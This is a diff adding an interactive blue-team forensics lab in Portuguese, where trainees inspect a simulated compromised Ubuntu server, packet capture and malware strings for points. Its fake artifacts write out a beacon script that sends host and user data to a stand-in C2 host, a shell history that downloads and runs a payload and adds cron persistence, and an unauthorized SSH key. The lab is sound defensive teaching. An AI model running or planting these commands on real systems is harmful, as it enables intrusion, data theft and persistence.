+  <div class="ato-wrap" id="ato1-wrap">
+    <div class="ato-card">
+      <div class="ato-hdr">
+        <div class="ato-num" id="ato1-num">1</div>
+        <div><div class="ato-tag">Ato 1</div><div class="ato-title">Análise de Disco</div></div>
+        <div class="ato-score" id="ato1-score">0 / 300 pts</div>
+      </div>
+      <div class="ato-body">
+        <div class="main-col">
+          <span class="sub-label">Imagem de Disco — ubuntu-srv01.img (20 GB)</span>
+          <div class="fex-card">
+            <div class="fex-tabs">
+              <button class="fex-tab active" data-tab="explorer">📁 Explorador</button>
+              <button class="fex-tab" data-tab="timeline">📅 Timeline</button>
+            </div>
+            <!-- Explorer panel -->
+            <div class="fex-body active" id="fex-explorer">
+              <div class="fex-tree-panel" id="fex-tree"></div>
+              <div class="fex-detail-panel" id="fex-detail">
+                <div class="fex-detail-empty">← Selecione um arquivo para inspecionar</div>
+              </div>
+            </div>
+            <!-- Timeline panel -->
+            <div class="fex-body fex-tl-body" id="fex-timeline">
+              <div class="fex-tl-actions">
+                <button class="btn-export-tl" id="btn-export-tl">📤 Exportar Timeline</button>
+                <span class="fex-tl-hint">Gera relatório ordenado por data de modificação</span>
+              </div>
+              <div id="fex-tl-content" style="flex:1;overflow-y:auto"></div>
+            </div>
+          </div>
+          <p class="log-hint">↑ Navegue nos arquivos · arquivos <span style="color:var(--orange)">laranja</span> = suspeitos</p>
+        </div>
+        <div class="side-col">
+          <div class="chk-header">Descobertas — Ato 1</div>
+          <div class="checklist">
+            <div class="chk-item" id="chk-disk-file"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Arquivo malicioso em /tmp identificado</div><span class="chk-pts">+75 pts</span></div></div>
+            <div class="chk-item" id="chk-disk-cron"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Timestamp futuro em /etc/cron.d/.update</div><span class="chk-pts">+75 pts</span></div></div>
+            <div class="chk-item" id="chk-disk-ssh"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Chave SSH não autorizada em authorized_keys</div><span class="chk-pts">+75 pts</span></div></div>
+            <div class="chk-item" id="chk-disk-timeline"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Timeline exportada e arquivo mais recente identificado</div><span class="chk-pts">+75 pts</span></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ ATO 2 — ANÁLISE DE REDE (locked) ═══ -->
+  <div class="ato-wrap section-wrap" id="ato2-wrap">
+    <div class="locked-card" id="ato2-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Ato 2 — Análise de Rede</div>
+      <div class="locked-msg">Complete 3 descobertas do Ato 1 para desbloquear</div>
+    </div>
+  </div>
+
+  <!-- ═══ ATO 3 — ANÁLISE DE MALWARE (locked) ═══ -->
+  <div class="ato-wrap section-wrap" id="ato3-wrap">
+    <div class="locked-card" id="ato3-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Ato 3 — Análise Estática de Malware</div>
+      <div class="locked-msg">Complete 3 descobertas do Ato 2 para desbloquear</div>
+    </div>
+  </div>
+
+  <!-- ═══ LAUDO FINAL (locked) ═══ -->
+  <div class="ato-wrap section-wrap" id="laudo-wrap">
+    <div class="locked-card" id="laudo-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Laudo Final — BTA-2024-0042</div>
+      <div class="locked-msg">Acumule 600 pts para desbloquear o laudo pericial</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <span class="footer-text">&copy; 2025 Blue Team Army. Todos os direitos reservados.</span>
+    <a class="footer-link" href="https://blueteam.army" target="_blank" rel="noopener">blueteam.army</a>
+  </footer>
+
+</div>
+
+<script>
+(function(){
+'use strict';
+
+/* ── Token Gate ── */
+(function(){
+  const inp=document.getElementById('token-input'),btn=document.getElementById('token-btn'),err=document.getElementById('token-err');
+  if(!inp)return;
+  function go(){
+    if(inp.value.trim()==='BTA-LAB06-2026'){localStorage.setItem('bta-lab06-access','BTA-LAB06-2026');document.documentElement.classList.remove('show-gate');}
+    else{err.classList.add('visible');inp.classList.add('tg-shake');inp.value='';setTimeout(()=>inp.classList.remove('tg-shake'),400);}
+  }
+  btn.addEventListener('click',go);
+  inp.addEventListener('keydown',e=>{if(e.key==='Enter')go();err.classList.remove('visible');});
+})();
+
+/* ── State ── */
+const score={a1:0,a2:0,a3:0};
+const done={a1:new Set(),a2:new Set(),a3:new Set()};
+const THRESH=200;
+function total(){return score.a1+score.a2+score.a3;}
+
+/* ── Helpers ── */
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function revealSection(el){el.style.display='block';el.offsetHeight;el.classList.add('visible');}
+function setProgStep(n,state){
+  const el=document.getElementById('prog-'+n);if(!el)return;
+  el.classList.remove('act-step--active','act-step--done');
+  if(state==='active')el.classList.add('act-step--active');
+  if(state==='done')el.classList.add('act-step--done');
+}
+
+/* ── Toast ── */
+let toastTimer=null;
+function showToast(label,pts,msg){
+  const t=document.getElementById('flag-toast');
+  document.getElementById('toast-label').textContent=label;
+  document.getElementById('toast-pts').textContent='+'+pts+' pts';
+  document.getElementById('toast-msg').textContent=msg;
+  t.classList.add('show');clearTimeout(toastTimer);
+  toastTimer=setTimeout(()=>t.classList.remove('show'),2800);
+}
+
+/* ── Award ── */
+function award(ato,key,pts,label,msg){
+  if(done[ato].has(key))return;
+  done[ato].add(key);score[ato]+=pts;
+  document.getElementById('hud-pts').textContent=total();
+  const chk=document.getElementById('chk-'+key);if(chk)chk.classList.add('done');
+  const sc=document.getElementById(ato+'-score');if(sc)sc.textContent=score[ato]+' / 300 pts';
+  if(score[ato]>=300){const num=document.getElementById(ato+'-num');if(num)num.classList.add('done');}
+  showToast(label,pts,msg);
+  checkUnlocks();
+}
+
+/* ── Unlocks ── */
+function checkUnlocks(){
+  if(score.a1>=THRESH&&!document.getElementById('ato2-card')){buildAto2();setProgStep(1,'done');setProgStep(2,'active');}
+  if(score.a2>=THRESH&&!document.getElementById('ato3-card')){buildAto3();setProgStep(2,'done');setProgStep(3,'active');}
+  if(total()>=600&&!document.getElementById('laudo-card')){buildLaudo();setProgStep(3,'done');setProgStep(4,'active');}
+}
+
+/* ════════════════════════════════════════
+   ATO 1 — FORENSIC EXPLORER
+   ════════════════════════════════════════ */
+const FILES={
+  '/etc/passwd':{mtime:'2024-10-01 09:00:11',size:'2.1 KB',perms:'-rw-r--r--',owner:'root:root',
+    content:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ndeployer:x:1001:1001::/home/deployer:/bin/bash\nsvc_helper:x:1002:1002::/home/svc_helper:/bin/bash'},
+  '/etc/hosts':{mtime:'2024-09-15 11:22:33',size:'318 B',perms:'-rw-r--r--',owner:'root:root',
+    content:'127.0.0.1  localhost\n127.0.1.1  linux01.corp.local linux01\n192.168.10.1  gw.corp.local\n192.168.10.7  linux01.corp.local'},
+  '/etc/crontab':{mtime:'2024-08-20 08:00:00',size:'720 B',perms:'-rw-r--r--',owner:'root:root',
+    content:'# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n17 * * * * root run-parts /etc/cron.hourly\n25 6 * * * root run-parts /etc/cron.daily'},
+  '/etc/cron.d/.update':{mtime:'2024-12-31 23:59:59',size:'312 B',perms:'-rw-r--r--',owner:'root:root',
+    suspicious:true,discovery:'disk-cron',future:true,
+    content:'# System maintenance update task\n# Installed by update-manager v2.1\n*/5 * * * * root /tmp/.cache_update > /dev/null 2>&1'},
+  '/home/deployer/.ssh/authorized_keys':{mtime:'2024-11-08 02:22:03',size:'420 B',perms:'-rw-------',owner:'deployer:deployer',
+    suspicious:true,discovery:'disk-ssh',
+    content:'# Authorized SSH public keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9fX8pKL2m... deployer@corp.local\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4mK1nRp8v... attacker@remote  ← NÃO AUTORIZADA'},
+  '/tmp/.cache_update':{mtime:'2024-11-08 02:21:47',size:'1.4 KB',perms:'-rwxr-xr-x',owner:'root:root',
+    suspicious:true,discovery:'disk-file',
+    content:'#!/bin/bash\n# System cache maintenance helper v1.0\n# DO NOT REMOVE\n\ncurl -s http://update-cdn185.net/gate.php \\\n  -d "host=$(hostname)&user=$(whoami)&os=$(uname -r)&pid=$$" \\\n  --connect-timeout 5 &\n\nsleep 300\nexec $0'},
+  '/var/log/auth.log':{mtime:'2024-11-08 06:15:22',size:'4.2 MB',perms:'-rw-r-----',owner:'syslog:adm',
+    content:'Nov  8 02:17:03 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54230 ssh2\nNov  8 02:17:31 linux01 sshd[4521]: Accepted password for root from 10.20.45.113 port 54278 ssh2\nNov  8 02:19:47 linux01 useradd[4891]: new user: name=svc_helper, UID=1002\nNov  8 02:21:15 linux01 cron[5012]: (root) CMD (/tmp/.cache_update)\nNov  8 02:22:03 linux01 sshd[5241]: Accepted publickey for deployer from 10.20.45.113 port 55102'},
+  '/var/log/syslog':{mtime:'2024-11-08 06:00:01',size:'12.8 MB',perms:'-rw-r-----',owner:'syslog:adm',
+    content:'Nov  8 02:17:31 linux01 sshd[4521]: pam_unix(sshd:session): session opened for user root\nNov  8 02:21:12 linux01 cron[4912]: (CRON) INFO running job pid 5012\nNov  8 02:21:47 linux01 bash[5099]: curl -s http://update-cdn185.net/gate.php ...\nNov  8 02:22:41 linux01 systemd[1]: Started WinDefend_Helper.service'},
+  '/root/.bash_history':{mtime:'2024-11-08 02:25:18',size:'812 B',perms:'-rw-------',owner:'root:root',
+    recent:true,
+    content:'ls -la /tmp\nwget http://185.220.101.45/setup.exe\nchmod +x setup.exe\n./setup.exe\ncurl -s http://update-cdn185.net/gate.php -d "test=1"\nuseradd -m svc_helper\necho "*/5 * * * * root /tmp/.cache_update" > /etc/cron.d/.update\nhistory -c'},
+};
+
+const TREE_DEF=[
+  {name:'etc',children:[
+    {name:'passwd',path:'/etc/passwd'},{name:'hosts',path:'/etc/hosts'},{name:'crontab',path:'/etc/crontab'},
+    {name:'cron.d',children:[{name:'.update',path:'/etc/cron.d/.update',suspicious:true}]},
+  ]},
+  {name:'home',children:[{name:'deployer',children:[{name:'.ssh',children:[{name:'authorized_keys',path:'/home/deployer/.ssh/authorized_keys',suspicious:true}]}]}]},
+  {name:'tmp',children:[{name:'.cache_update',path:'/tmp/.cache_update',suspicious:true}]},
+  {name:'var',children:[{name:'log',children:[{name:'auth.log',path:'/var/log/auth.log'},{name:'syslog',path:'/var/log/syslog'}]}]},
+  {name:'root',children:[{name:'.bash_history',path:'/root/.bash_history',recent:true}]},
+];
+
+const openDirs=new Set(['etc','home','tmp','var','root','cron.d','deployer','.ssh','log']);
+
+function buildTree(nodes,depth){
+  const wrap=document.createElement('div');
+  nodes.forEach(node=>{
+    const indent=(depth*14+8)+'px';
+    if(node.children){
+      const isOpen=openDirs.has(node.name);
+      const dir=document.createElement('div');
+      const row=document.createElement('div');
+      row.className='tree-node';
+      row.style.paddingLeft=indent;
+      const chev=document.createElement('span');
+      chev.className='tree-chevron'+(isOpen?' open':'');
+      chev.textContent='▶';
+      const icon=document.createElement('span');icon.className='tree-icon';icon.textContent='📁';
+      const nm=document.createElement('span');nm.className='tree-name';nm.textContent=node.name+'/';
+      row.append(chev,icon,nm);
+      const children=buildTree(node.children,depth+1);
+      children.className='tree-children'+(isOpen?' open':'');
+      row.addEventListener('click',e=>{e.stopPropagation();const op=children.classList.toggle('open');chev.classList.toggle('open',op);icon.textContent=op?'📂':'📁';});
+      dir.append(row,children);
+      wrap.append(dir);
+    } else {
+      const row=document.createElement('div');
+      row.className='tree-node'+(node.suspicious?' suspicious':node.recent?' recent':'');
+      row.style.paddingLeft=indent;
+      const chev=document.createElement('span');chev.className='tree-chevron';
+      const icon=document.createElement('span');icon.className='tree-icon';
+      icon.textContent=node.suspicious?'⚠️':node.recent?'📋':'📄';
+      const nm=document.createElement('span');nm.className='tree-name';nm.textContent=node.name;
+      row.append(chev,icon,nm);
+      row.addEventListener('click',()=>openFile(node.path,row));
+      wrap.append(row);
+    }
+  });
+  return wrap;
+}
+
+function openFile(path,rowEl){
+  document.querySelectorAll('.tree-node.selected').forEach(el=>el.classList.remove('selected'));
+  if(rowEl)rowEl.classList.add('selected');
+  const f=FILES[path];
+  if(!f)return;
+  const detail=document.getElementById('fex-detail');
+
+  // Build suspicious-highlighted content
+  let contentHtml='';
+  const lines=(f.content||'').split('\n');
+  const isSsh=path.includes('authorized_keys');
+  const isCache=path.includes('.cache_update');
+  lines.forEach(line=>{
+    let cls='';
+    if(isSsh&&line.includes('← NÃO AUTORIZADA'))cls=' class="warning-line"';
+    else if(isCache&&line.includes('curl'))cls=' class="suspicious-line"';
+    contentHtml+=`<span${cls}>${esc(line)}\n</span>`;
+  });
+
+  const futureRow=f.future?'<tr class="future"><td>Modificado</td><td>'+esc(f.mtime)+' ⚠ TIMESTAMP FUTURO</td></tr>'
+                         :'<tr><td>Modificado</td><td>'+esc(f.mtime)+'</td></tr>';
+  detail.innerHTML=`
+    <div class="fex-meta-table">
+      <table>
+        <tr><td>Arquivo</td><td>${esc(path)}</td></tr>
+        <tr><td>Tamanho</td><td>${esc(f.size)}</td></tr>
+        ${futureRow}
+        <tr><td>Permissões</td><td>${esc(f.perms)}</td></tr>
+        <tr><td>Proprietário</td><td>${esc(f.owner)}</td></tr>
+      </table>
+    </div>
+    <div class="fex-content">${contentHtml}</div>`;
+
+  if(f.discovery)award('a1',f.discovery,75,
+    f.discovery==='disk-file'?'📁 Descoberta!':f.discovery==='disk-cron'?'⚠️ Anomalia!':'🔑 Descoberta!',
+    f.discovery==='disk-file'?'Script malicioso em /tmp encontrado':
+    f.discovery==='disk-cron'?'Timestamp futuro em /etc/cron.d/.update — antiforense':
+    'Chave SSH não autorizada em authorized_keys');
+}
+
+// Init file tree
+const treeEl=document.getElementById('fex-tree');
+treeEl.appendChild(buildTree(TREE_DEF,0));
+
+// Tab switching
+document.querySelectorAll('.fex-tab').forEach(btn=>{
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.fex-tab').forEach(b=>b.classList.remove('active'));
+    document.querySelectorAll('.fex-body').forEach(b=>b.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById('fex-'+this.dataset.tab).classList.add('active');
+  });
+});
+
+// Export timeline
+document.getElementById('btn-export-tl').addEventListener('click',function(){
+  const content=document.getElementById('fex-tl-content');
+  const sortedFiles=Object.entries(FILES)
+    .map(([path,f])=>({path,mtime:f.mtime,suspicious:!!f.suspicious,future:!!f.future,recent:!!f.recent}))
+    .sort((a,b)=>b.mtime.localeCompare(a.mtime));
+  const rows=sortedFiles.map(f=>{
+    const cls=f.future?'tl-future':f.suspicious?'tl-suspicious':f.recent?'tl-recent':'';
+    const badge=f.future?' ⚠ FUTURO':f.suspicious?' [suspeito]':f.recent?' ← mais recente':'';
+    return`<tr class="${cls}"><td>${esc(f.mtime)}</td><td>${esc(f.path)}${badge}</td><td>${f.suspicious?'modificado*':'modificado'}</td></tr>`;
+  }).join('');
+  content.innerHTML=`<table class="fex-tl-table"><thead><tr><th>Data/Hora</th><th>Arquivo</th><th>Evento</th></tr></thead><tbody>${rows}</tbody></table>`;
+  award('a1','disk-timeline',75,'📅 Timeline!','Arquivo mais recente identificado na timeline forense');
+  this.textContent='✓ Exportado';this.disabled=true;
+});
+
+/* ════════════════════════════════════════
+   ATO 2 — PACKET VIEWER
+   ════════════════════════════════════════ */
+const CAPTURE=[
+  {num:1,time:'01:55:12.001',src:'192.168.10.7',dst:'8.8.8.8',proto:'DNS',len:62,info:'Standard query A google.com',cls:''},
+  {num:2,time:'01:55:12.045',src:'8.8.8.8',dst:'192.168.10.7',proto:'DNS',len:78,info:'Standard response A 142.250.80.14',cls:'',detail:'Resposta DNS normal — domínio legítimo'},
+  {num:3,time:'02:00:01.112',src:'192.168.10.7',dst:'8.8.8.8',proto:'DNS',len:71,info:'Standard query A update-cdn185.net',cls:'pkt-anomalous',discovery:'net-dns',detail:'⚠ Consulta DNS para domínio suspeito: update-cdn185.net'},
+  {num:4,time:'02:00:01.334',src:'8.8.8.8',dst:'192.168.10.7',proto:'DNS',len:87,info:'Standard response A 185.220.101.45',cls:'pkt-anomalous',discovery:'net-dns',detail:'⚠ Resolução: update-cdn185.net → 185.220.101.45 (IP malicioso confirmado)'},
+  {num:5,time:'02:00:01.450',src:'192.168.10.7',dst:'185.220.101.45',proto:'DNS',len:75,info:'Standard query A update-cdn185.net (retry)',cls:'pkt-anomalous',discovery:'net-dns',detail:'⚠ Segunda consulta ao mesmo domínio suspeito'},
+  {num:6,time:'02:00:02.001',src:'192.168.10.7',dst:'185.220.101.45',proto:'HTTP',len:412,info:'GET /setup.exe HTTP/1.1',cls:'pkt-anomalous',discovery:'net-download',detail:'⚠ Download de payload:\nGET /setup.exe HTTP/1.1\nHost: update-cdn185.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)'},
+  {num:7,time:'02:00:02.112',src:'185.220.101.45',dst:'192.168.10.7',proto:'TCP',len:9566,info:'HTTP/1.1 200 OK — payload [1/5]',cls:'pkt-anomalous',discovery:'net-payload',detail:'⚠ Resposta: Content-Type: application/octet-stream\nContent-Length: 47832\nSegmento 1 de 5'},
+  {num:8,time:'02:00:02.224',src:'185.220.101.45',dst:'192.168.10.7',proto:'TCP',len:9566,info:'TCP segment [2/5] continuation',cls:'pkt-anomalous',discovery:'net-payload',detail:'⚠ Segmento 2 de 5 — acumulado: ~19.1 KB'},
+  {num:9,time:'02:00:02.336',src:'185.220.101.45',dst:'192.168.10.7',proto:'TCP',len:9566,info:'TCP segment [3/5] continuation',cls:'pkt-anomalous',discovery:'net-payload',detail:'⚠ Segmento 3 de 5 — acumulado: ~28.7 KB'},
+  {num:10,time:'02:00:02.448',src:'185.220.101.45',dst:'192.168.10.7',proto:'TCP',len:9567,info:'TCP segment [4/5] continuation',cls:'pkt-anomalous',discovery:'net-payload',detail:'⚠ Segmento 4 de 5 — acumulado: ~38.3 KB'},
+  {num:11,time:'02:00:02.560',src:'185.220.101.45',dst:'192.168.10.7',proto:'TCP',len:9567,info:'TCP FIN [5/5] — total: 47.832 bytes',cls:'pkt-anomalous',discovery:'net-payload',detail:'⚠ Transferência concluída: 47.832 bytes totais\nSetup.exe recebido com sucesso'},
+  {num:12,time:'02:05:00.001',src:'192.168.10.15',dst:'172.217.28.4',proto:'HTTPS',len:854,info:'TLSv1.3 Application Data (normal)',cls:'',detail:'Tráfego legítimo — Google · Sem anomalia'},
+  {num:13,time:'02:17:05.001',src:'192.168.10.7',dst:'185.220.101.45',proto:'HTTP',len:312,info:'POST /gate.php HTTP/1.1 — beacon C2',cls:'pkt-anomalous',discovery:'net-c2',detail:'⚠ Beacon C2:\nPOST /gate.php HTTP/1.1\nHost: update-cdn185.net:8080\nBody: host=srv01&user=root&os=linux'},
+  {num:14,time:'02:22:05.001',src:'192.168.10.7',dst:'185.220.101.45',proto:'HTTP',len:312,info:'POST /gate.php HTTP/1.1 — intervalo 300s',cls:'pkt-anomalous',discovery:'net-c2',detail:'⚠ Beacon 2 — intervalo: exatamente 300s\nDados: host=srv01&user=root&pivot=svc_helper'},
+  {num:15,time:'02:27:05.001',src:'192.168.10.7',dst:'185.220.101.45',proto:'HTTP',len:312,info:'POST /gate.php HTTP/1.1 — intervalo 300s',cls:'pkt-anomalous',discovery:'net-c2',detail:'⚠ Beacon 3 — padrão C2 confirmado: 300s exatos'},
+  {num:16,time:'02:32:05.001',src:'192.168.10.7',dst:'185.220.101.45',proto:'HTTP',len:312,info:'POST /gate.php HTTP/1.1 — intervalo 300s',cls:'pkt-anomalous',discovery:'net-c2',detail:'⚠ Beacon 4 — C2 ativo por >15 minutos'},
+];
+
+const NET_DISC_LABELS={
+  'net-dns':['🌐 Descoberta!','Resolução DNS de update-cdn185.net → 185.220.101.45'],
+  'net-download':['📥 Descoberta!','Download de payload setup.exe (47.832 bytes)'],
+  'net-payload':['📦 Descoberta!','Tamanho total do payload calculado: 47.832 bytes'],
+  'net-c2':['📡 Descoberta!','Beacon C2 pós-infecção (POST /gate.php, intervalo 300s)'],
+};
+
+function buildAto2(){
+  const wrap=document.getElementById('ato2-wrap');
+  const rowsHtml=CAPTURE.map((p,i)=>{
+    const protoCls={DNS:'proto-dns',HTTP:'proto-http',HTTPS:'proto-https',TCP:'proto-tcp'}[p.proto]||'';
+    return`<tr class="pkt-row ${p.cls}" data-idx="${i}">
+      <td>${p.num}</td><td>${p.time}</td><td>${esc(p.src)}</td><td>${esc(p.dst)}</td>
+      <td class="${protoCls}">${p.proto}</td><td>${p.len}</td>
+      <td class="pkt-info">${esc(p.info)}</td>
+    </tr>
+    <tr class="pkt-detail-row"><td colspan="7" class="pkt-detail-cell">${esc(p.detail||'Tráfego normal')}</td></tr>`;
+  }).join('');
+
+  wrap.innerHTML=`
+  <div class="ato-card" id="ato2-card">
+    <div class="ato-hdr">
+      <div class="ato-num" id="ato2-num">2</div>
+      <div><div class="ato-tag">Ato 2</div><div class="ato-title">Análise de Rede</div></div>
+      <div class="ato-score" id="ato2-score">0 / 300 pts</div>
+    </div>
+    <div class="ato-body">
+      <div class="main-col">
+        <span class="sub-label">Captura de Rede — linux01.corp.local (capture.pcap)</span>
+        <div class="pkt-toolbar">
+          <button class="pkt-filter-btn active" data-filter="all">Todos</button>
+          <button class="pkt-filter-btn" data-filter="DNS">DNS</button>
+          <button class="pkt-filter-btn" data-filter="HTTP">HTTP</button>
+          <button class="pkt-filter-btn" data-filter="TCP">TCP</button>
+          <button class="pkt-filter-btn" data-filter="185.220.101.45">185.220.101.45</button>
+        </div>
+        <div class="pkt-table-wrap">
+          <table class="pkt-table">
+            <thead><tr><th>#</th><th>Tempo</th><th>Origem</th><th>Destino</th><th>Proto</th><th>Len</th><th>Info</th></tr></thead>
+            <tbody id="ato2-tbody">${rowsHtml}</tbody>
+          </table>
+        </div>
+        <p class="log-hint">↑ Clique em um pacote para ver detalhes · pacotes <span style="color:var(--orange)">laranja</span> = suspeitos</p>
+      </div>
+      <div class="side-col">
+        <div class="chk-header">Descobertas — Ato 2</div>
+        <div class="checklist">
+          <div class="chk-item" id="chk-net-dns"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Resolução DNS de domínio suspeito</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-net-download"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Download do payload GET /setup.exe</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-net-payload"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Tamanho do payload calculado (47.832 bytes)</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-net-c2"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Beacon C2 pós-infecção identificado</div><span class="chk-pts">+75 pts</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+  revealSection(wrap);
+
+  const tbody=document.getElementById('ato2-tbody');
+  tbody.querySelectorAll('.pkt-row').forEach(row=>{
+    row.addEventListener('click',function(){
+      const wasOpen=this.classList.contains('open');
+      tbody.querySelectorAll('.pkt-row').forEach(r=>r.classList.remove('open','selected'));
+      if(!wasOpen){
+        this.classList.add('open','selected');
+        const pkt=CAPTURE[parseInt(this.dataset.idx)];
+        if(pkt.discovery&&NET_DISC_LABELS[pkt.discovery]){
+          const[lbl,msg]=NET_DISC_LABELS[pkt.discovery];
+          award('a2',pkt.discovery,75,lbl,msg);
+        }
+      }
+    });
+  });
+
+  wrap.querySelectorAll('.pkt-filter-btn').forEach(btn=>{
+    btn.addEventListener('click',function(){
+      wrap.querySelectorAll('.pkt-filter-btn').forEach(b=>b.classList.remove('active'));
+      this.classList.add('active');const f=this.dataset.filter;
+      let vis=0;
+      tbody.querySelectorAll('.pkt-row').forEach(row=>{
+        const p=CAPTURE[parseInt(row.dataset.idx)];
+        const hide=f!=='all'&&p.proto!==f&&p.src!==f&&p.dst!==f;
+        row.style.display=hide?'none':'';
+        const det=row.nextElementSibling;if(det)det.style.display=hide?'none':'';
+        if(!hide)row.cells[0].textContent=++vis;
+      });
+    });
+  });
+}
+
+/* ════════════════════════════════════════
+   ATO 3 — MALWARE ANALYSIS
+   ════════════════════════════════════════ */
+const STRINGS_DATA=[
+  {t:'normal',v:'MZ'},
+  {t:'normal',v:'This program cannot be run in DOS mode'},
+  {t:'normal',v:'.text'},
+  {t:'normal',v:'.data'},
+  {t:'normal',v:'.rsrc'},
+  {t:'normal',v:'UPX0'},
+  {t:'normal',v:'UPX1'},
+  {t:'normal',v:'KERNEL32.DLL'},
+  {t:'normal',v:'NTDLL.DLL'},
+  {t:'normal',v:'USER32.DLL'},
+  {t:'normal',v:'ADVAPI32.DLL'},
+  {t:'normal',v:'WINHTTP.DLL'},
+  {t:'api',v:'GetSystemTime'},
+  {t:'api',v:'ExitProcess'},
+  {t:'api',v:'GetModuleHandleA'},
+  {t:'api',v:'LoadLibraryA'},
+  {t:'api',v:'GetProcAddress'},
+  {t:'api',v:'GetTempPathA'},
+  {t:'api',v:'CreateFileA'},
+  {t:'api',v:'WriteFile'},
+  {t:'api',v:'CloseHandle'},
+  {t:'suspect',v:'VirtualAllocEx'},
+  {t:'suspect',v:'WriteProcessMemory'},
+  {t:'suspect',v:'CreateRemoteThread'},
+  {t:'suspect',v:'RegOpenKeyExA'},
+  {t:'suspect',v:'RegSetValueExA'},
+  {t:'suspect',v:'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'},
+  {t:'suspect',v:'Global\\svc_update_mutex_2024'},
+  {t:'critical',v:'http://update-cdn185.net/gate.php'},
+  {t:'critical',v:'185.220.101.45:8080'},
+  {t:'normal',v:'cmd.exe'},
+  {t:'normal',v:'powershell.exe -enc'},
+  {t:'normal',v:'C:\\Windows\\System32\\svchost.exe'},
+  {t:'normal',v:'%TEMP%\\svc_update.tmp'},
+];
+
+const HL_RESULT={
+  hash:'9c2d4b6e8a0f1c3d5e7b9a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8ac',
+  detections:'34/72 engines',
+  name:'Trojan.Generic.Backdoor',
+  family:'BlackBerry RAT',
+  firstSeen:'2024-10-15',
+  tags:['backdoor','persistence','c2','upx-packed','process-injection'],
+  iocs:['185.220.101.45','update-cdn185.net','Global\\svc_update_mutex_2024'],
+};
+
+function buildAto3(){
+  const wrap=document.getElementById('ato3-wrap');
+  const stringsHtml=STRINGS_DATA.map((s,i)=>{
+    if(s.t==='critical')return`<span class="str-critical" data-sidx="${i}">  ${esc(s.v)}</span>\n`;
+    if(s.t==='suspect')return`<span class="str-suspect">  ${esc(s.v)}</span>\n`;
+    if(s.t==='api')return`<span class="str-api">  ${esc(s.v)}</span>\n`;
+    return`<span class="str-normal">  ${esc(s.v)}</span>\n`;
+  }).join('');
+
+  const tagsHtml=HL_RESULT.tags.map(t=>`<span class="hl-tag">${esc(t)}</span>`).join('');
+
+  wrap.innerHTML=`
+  <div class="ato-card" id="ato3-card">
+    <div class="ato-hdr">
+      <div class="ato-num" id="ato3-num">3</div>
+      <div><div class="ato-tag">Ato 3</div><div class="ato-title">Análise Estática de Malware</div></div>
+      <div class="ato-score" id="ato3-score">0 / 300 pts</div>
+    </div>
+    <div class="ato-body">
+      <div class="main-col">
+        <span class="sub-label">Bancada de Análise — setup.exe (47.832 bytes)</span>
+        <div class="mal-card">
+          <div class="mal-tabs">
+            <button class="mal-tab active" data-mtab="file">$ file</button>
+            <button class="mal-tab" data-mtab="strings">$ strings</button>
+            <button class="mal-tab" data-mtab="sha256">$ sha256sum</button>
+            <button class="mal-tab" data-mtab="lookup">Hash Lookup</button>
+          </div>
+          <!-- Tab: file -->
+          <div class="mal-panel active" id="mtab-file">
+            <p class="mal-cmd-line"><span class="prompt">analyst@bta-forensics:~$</span> file setup.exe</p>
+            <button class="btn-run-cmd" id="btn-file-run">▶ Executar</button>
+            <div class="mal-output-box" id="out-file"><span class="mal-placeholder">// Clique em Executar para identificar o tipo de arquivo</span></div>
+          </div>
+          <!-- Tab: strings -->
+          <div class="mal-panel" id="mtab-strings">
+            <p class="mal-cmd-line"><span class="prompt">analyst@bta-forensics:~$</span> strings setup.exe | head -34</p>
+            <button class="btn-run-cmd" id="btn-strings-run">▶ Executar</button>
+            <div class="mal-output-box" id="out-strings"><span class="mal-placeholder">// Clique em Executar para extrair strings</span></div>
+          </div>
+          <!-- Tab: sha256sum -->
+          <div class="mal-panel" id="mtab-sha256">
+            <p class="mal-cmd-line"><span class="prompt">analyst@bta-forensics:~$</span> sha256sum setup.exe</p>
+            <button class="btn-run-cmd" id="btn-sha256-run">▶ Executar</button>
+            <div class="mal-output-box" id="out-sha256"><span class="mal-placeholder">// Clique em Executar para calcular o hash</span></div>
+          </div>
+          <!-- Tab: lookup -->
+          <div class="mal-panel" id="mtab-lookup">
+            <p class="mal-cmd-line"><span class="prompt">analyst@bta-forensics:~$</span> bta-lookup --hash &lt;sha256&gt;</p>
+            <div class="hash-lookup-box">
+              <div class="hl-hash-row">
+                <span class="hl-hash-val" id="hl-hash-display">9c2d4b6e8a0f1c3d5e7b9a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8ac</span>
+                <button class="btn-lookup" id="btn-lookup">Consultar Hash</button>
+              </div>
+              <div class="hl-result" id="hl-result">
+                <div class="hl-verdict">
+                  <span class="hl-verdict-icon">🦠</span>
+                  <div>
